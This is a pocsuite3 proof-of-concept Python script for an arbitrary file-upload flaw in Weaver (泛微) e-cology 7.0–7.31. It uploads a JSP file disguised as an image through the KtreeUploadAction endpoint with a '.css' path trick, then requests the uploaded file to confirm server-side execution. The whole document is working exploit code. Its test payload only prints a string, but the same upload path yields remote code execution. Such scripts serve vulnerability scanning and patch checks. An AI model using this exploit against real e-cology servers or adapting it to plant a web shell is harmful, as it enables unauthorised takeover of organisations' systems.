from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology /com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 存在文件上传漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司ecology /com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self, verify=True):
        result = {}
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
        }
        vul_url = self.url+'/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image'
        filename = random_str(6) + '.jsp'
        filec = '<%out.println("hello2022 ! world2022");%>'
        files = {'files':(filename,filec,'image/jpeg')}
        resp = requests.post(url=vul_url, headers=headers, verify=False, files=files, allow_redirects=False, timeout=10)
        if resp.status_code == 200 and "'title':'','state':'SUCCESS'" in resp.text:
            vul_path = re.findall("'url':'(.*)?','title':'','",resp.text)[0]
            vul_url1 = self.url+vul_path
            resp1 = requests.get(vul_url1,headers=headers,allow_redirects=False,verify=False,timeout=10)
            if resp1.status_code == 200 and 'hello2022 ! world2022' in resp1.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = vul_url1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)